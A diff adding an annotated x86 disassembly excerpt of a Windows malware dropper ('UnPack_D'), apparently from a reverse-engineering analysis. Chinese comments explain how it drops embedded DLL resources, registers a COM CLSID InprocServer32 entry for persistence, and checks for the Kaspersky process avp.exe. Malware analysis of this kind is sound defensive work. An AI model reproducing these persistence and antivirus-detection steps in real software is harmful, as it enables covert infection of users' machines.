@@ -1,0 +1,94 @@
+
+```
+00401721  |.  8D7C24 11     LEA EDI,DWORD PTR SS:[ESP+11]
+00401725  |.  F3:AB         REP STOS DWORD PTR ES:[EDI]
+00401727  |.  66:AB         STOS WORD PTR ES:[EDI]
+00401729  |.  AA            STOS BYTE PTR ES:[EDI]
+0040172A  |.  33C0          XOR EAX,EAX
+0040172C  |.  C68424 100100>MOV BYTE PTR SS:[ESP+110],0
+00401734  |.  B9 3F000000   MOV ECX,3F
+00401739  |.  8DBC24 110100>LEA EDI,DWORD PTR SS:[ESP+111]
+00401740  |.  F3:AB         REP STOS DWORD PTR ES:[EDI]
+00401742  |.  66:AB         STOS WORD PTR ES:[EDI]
+00401744  |.  AA            STOS BYTE PTR ES:[EDI]
+00401745  |.  68 00010000   PUSH 100                                ; /BufSize = 100 (256.)
+0040174A  |.  8D4424 14     LEA EAX,DWORD PTR SS:[ESP+14]           ; |
+0040174E  |.  50            PUSH EAX                                ; |Buffer
+0040174F  |.  FFD6          CALL ESI                                ; \GetWindowsDirectoryA
+00401751  |.  8B3D 34204000 MOV EDI,DWORD PTR DS:[<&kernel32.lstrca>;  kernel32.lstrcatA
+00401757  |.  68 78214000   PUSH UnPack_D.00402178                  ; /String2 = "\Downloaded Program Files\ZipExt32.dll"
+0040175C  |.  8D4C24 14     LEA ECX,DWORD PTR SS:[ESP+14]           ; |
+00401760  |.  51            PUSH ECX                                ; |String1
+00401761  |.  FFD7          CALL EDI                                ; \lstrcat
+00401763  |.  68 00010000   PUSH 100                                ; /BufSize = 100 (256.)
+00401768  |.  8D9424 140100>LEA EDX,DWORD PTR SS:[ESP+114]          ; |
+0040176F  |.  52            PUSH EDX                                ; |Buffer
+00401770  |.  FFD6          CALL ESI                                ; \GetWindowsDirectoryA
+00401772  |.  68 10234000   PUSH UnPack_D.00402310                  ; /String2 = "\Downloaded Program Files\Ext32.dat"
+00401777  |.  8D8424 140100>LEA EAX,DWORD PTR SS:[ESP+114]          ; |
+0040177E  |.  50            PUSH EAX                                ; |String1
+0040177F  |.  FFD7          CALL EDI                                ; \lstrcat
+00401781  |.  8D8C24 100100>LEA ECX,DWORD PTR SS:[ESP+110]
+00401788  |.  51            PUSH ECX                                ; /FileName
+00401789  |.  FF15 68204000 CALL DWORD PTR DS:[<&kernel32.DeleteFil>; \DeleteFileA
+0040178F  |.  8D9424 100100>LEA EDX,DWORD PTR SS:[ESP+110]          ;  删除 C:\windows\Downloaded Program Files\Ext32.dat
+00401796  |.  52            PUSH EDX                                ; /NewName
+00401797  |.  8D4424 14     LEA EAX,DWORD PTR SS:[ESP+14]           ; |C:\windows\Downloaded Program Files\ZipExt32.dll 改名 C:\windows\Downloaded Program Files\Ext32.dll
+0040179B  |.  50            PUSH EAX                                ; |ExistingName
+0040179C  |.  FF15 70204000 CALL DWORD PTR DS:[<&kernel32.MoveFileA>; \MoveFileA
+004017A2  |.  E8 89FCFFFF   CALL UnPack_D.00401430                  ;  先。删除以前生成的相关dll，再释放资源 ceo 到C:\windows\Downloaded Program Files\ZipExt32.dll
+004017A7  |.  E8 84FEFFFF   CALL UnPack_D.00401630                  ;  释放资源 hiv 到 c:\tmp.hiv,执行完他的任务，去死
+004017AC  |.  8B1D 18204000 MOV EBX,DWORD PTR DS:[<&advapi32.RegCre>;  advapi32.RegCreateKeyA
+004017B2  |.  8D4C24 0C     LEA ECX,DWORD PTR SS:[ESP+C]
+004017B6  |.  51            PUSH ECX                                ; /pHandle
+004017B7  |.  68 E0224000   PUSH UnPack_D.004022E0                  ; |Subkey = "CLSID\{35CEC8A3-2BE6-11D2-8773-92E220524140}"
+004017BC  |.  68 00000080   PUSH 80000000                           ; |hKey = HKEY_CLASSES_ROOT
+004017C1  |.  FFD3          CALL EBX                                ; \RegCreateKeyA
+004017C3  |.  8B35 6C204000 MOV ESI,DWORD PTR DS:[<&kernel32.lstrle>;  建立 CLSID\{35CEC8A3-2BE6-11D2-8773-92E220524140}
+004017C9  |.  68 D4224000   PUSH UnPack_D.004022D4                  ; /String = "ZipExt32"
+004017CE  |.  FFD6          CALL ESI                                ; \lstrlenA
+004017D0  |.  8B5424 0C     MOV EDX,DWORD PTR SS:[ESP+C]
+004017D4  |.  8B3D 14204000 MOV EDI,DWORD PTR DS:[<&advapi32.RegSet>;  advapi32.RegSetValueExA
+004017DA  |.  50            PUSH EAX                                ; /BufSize
+004017DB  |.  68 D4224000   PUSH UnPack_D.004022D4                  ; |Buffer = UnPack_D.004022D4
+004017E0  |.  6A 01         PUSH 1                                  ; |ValueType = REG_SZ
+004017E2  |.  6A 00         PUSH 0                                  ; |Reserved = 0
+004017E4  |.  68 D0224000   PUSH UnPack_D.004022D0                  ; |ValueName = ""
+004017E9  |.  52            PUSH EDX                                ; |hKey
+004017EA  |.  FFD7          CALL EDI                                ; \RegSetValueExA
+004017EC  |.  8B4424 0C     MOV EAX,DWORD PTR SS:[ESP+C]
+004017F0  |.  50            PUSH EAX                                ; /hKey
+004017F1  |.  FF15 10204000 CALL DWORD PTR DS:[<&advapi32.RegCloseK>; \RegCloseKey
+004017F7  |.  8D4C24 0C     LEA ECX,DWORD PTR SS:[ESP+C]
+004017FB  |.  51            PUSH ECX                                ; /pHandle
+004017FC  |.  68 94224000   PUSH UnPack_D.00402294                  ; |Subkey = "CLSID\{35CEC8A3-2BE6-11D2-8773-92E220524140}\InprocServer32"
+00401801  |.  68 00000080   PUSH 80000000                           ; |hKey = HKEY_CLASSES_ROOT
+00401806  |.  FFD3          CALL EBX                                ; \RegCreateKeyA
+00401808  |.  8D5424 10     LEA EDX,DWORD PTR SS:[ESP+10]           ;  以下是 建立 CLSID\{35CEC8A3-2BE6-11D2-8773-92E220524140}等与之关联项目
+0040180C  |.  52            PUSH EDX                                ; /String
+0040180D  |.  FFD6          CALL ESI                                ; \lstrlenA
+0040180F  |.  8B4C24 0C     MOV ECX,DWORD PTR SS:[ESP+C]
+00401813  |.  50            PUSH EAX                                ; /BufSize
+00401814  |.  8D4424 14     LEA EAX,DWORD PTR SS:[ESP+14]           ; |
+00401818  |.  50            PUSH EAX                                ; |Buffer
+00401819  |.  6A 01         PUSH 1                                  ; |ValueType = REG_SZ
+0040181B  |.  6A 00         PUSH 0                                  ; |Reserved = 0
+0040181D  |.  68 D0224000   PUSH UnPack_D.004022D0                  ; |ValueName = ""
+00401822  |.  51            PUSH ECX                                ; |hKey
+00401823  |.  FFD7          CALL EDI                                ; \RegSetValueExA
+00401825  |.  68 8C224000   PUSH UnPack_D.0040228C                  ; /String = "Both"
+0040182A  |.  FFD6          CALL ESI                                ; \lstrlenA
+0040182C  |.  8B5424 0C     MOV EDX,DWORD PTR SS:[ESP+C]
+00401830  |.  50            PUSH EAX                                ; /BufSize
+00401831  |.  68 8C224000   PUSH UnPack_D.0040228C                  ; |Buffer = UnPack_D.0040228C
+00401836  |.  6A 01         PUSH 1                                  ; |ValueType = REG_SZ
+00401838  |.  6A 00         PUSH 0                                  ; |Reserved = 0
+0040183A  |.  68 7C224000   PUSH UnPack_D.0040227C                  ; |ValueName = "ThreadingModel"
+0040183F  |.  52            PUSH EDX                                ; |hKey
+00401840  |.  FFD7          CALL EDI                                ; \RegSetValueExA
+00401842  |.  8B4424 0C     MOV EAX,DWORD PTR SS:[ESP+C]
+00401846  |.  50            PUSH EAX                                ; /hKey
+00401847  |.  FF15 10204000 CALL DWORD PTR DS:[<&advapi32.RegCloseK>; \RegCloseKey
+0040184D  |.  E8 AEF7FFFF   CALL UnPack_D.00401000                  ;  检测是否有 avp.exe
+00401852  |.  84C0          TEST AL,AL
+```
